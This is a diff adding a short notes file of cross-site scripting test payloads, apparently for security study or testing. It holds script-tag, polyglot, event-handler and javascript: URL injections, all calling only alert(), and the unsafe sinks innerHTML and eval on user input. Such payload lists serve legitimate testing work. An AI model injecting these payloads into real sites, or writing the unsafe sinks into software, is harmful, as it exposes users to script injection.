@@ -1,0 +1,25 @@
+Inline Snippets:
+====================
+
+<script>alert(1)</script>
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+
+<img src="x" onerror="javascript:alert()">
+
+element.innerHTML = userInput
+
+eval(userInput); // Dangerous if userInput = "alert('XSS')"
+
+<a href="javascript:alert('XSS')">Click me</a>
+
+javascript:alert('eureka')
+
+
+Terms:
+======
+
+"Execution sink"
+
